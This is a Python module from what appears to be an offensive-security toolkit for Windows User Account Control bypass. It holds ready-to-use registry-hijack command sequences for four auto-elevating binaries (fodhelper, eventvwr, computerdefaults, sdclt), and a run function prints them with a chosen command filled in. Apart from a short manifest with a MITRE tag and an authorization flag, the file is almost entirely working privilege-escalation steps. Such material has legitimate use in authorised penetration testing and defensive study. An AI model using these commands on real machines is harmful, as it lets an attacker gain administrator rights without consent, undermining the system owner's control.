"""UAC bypass — multiple techniques for User Account Control evasion."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.uac_bypass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["registry_modification", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1548.002"],
}

TECHNIQUES = {
    "fodhelper": {
        "desc": "Registry key hijack via fodhelper.exe (auto-elevate)",
        "cmd": [
            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{cmd}" /f',
            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f',
            'fodhelper.exe',
        ],
    },
    "eventvwr": {
        "desc": "Registry key hijack via eventvwr.exe",
        "cmd": [
            'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "{cmd}" /f',
            'eventvwr.exe',
        ],
    },
    "computerdefaults": {
        "desc": "Registry key hijack via computerdefaults.exe",
        "cmd": [
            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{cmd}" /f',
            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f',
            'computerdefaults.exe',
        ],
    },
    "sdclt": {
        "desc": "sdclt.exe app path hijack",
        "cmd": [
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" /d "{cmd}" /f',
            'sdclt.exe',
        ],
    },
}


def run(args: Any) -> int:
    technique = getattr(args, "uac_technique", "fodhelper")
    command = getattr(args, "command", "cmd.exe")

    if technique == "list":
        print("[*] UAC bypass techniques:")
        for name, info in TECHNIQUES.items():
            print("  {} — {}".format(name, info["desc"]))
        return 0

    info = TECHNIQUES.get(technique)
    if not info:
        print(f"[!] Unknown: {technique}")
        return 1

    print("[*] UAC bypass: {} — {}".format(technique, info["desc"]))
    for step in info["cmd"]:
        print(f"  {step.format(cmd=command)}")

    print("\n[*] Cleanup:")
    if "ms-settings" in str(info["cmd"]):
        print("  reg delete HKCU\\Software\\Classes\\ms-settings /f")
    return 0
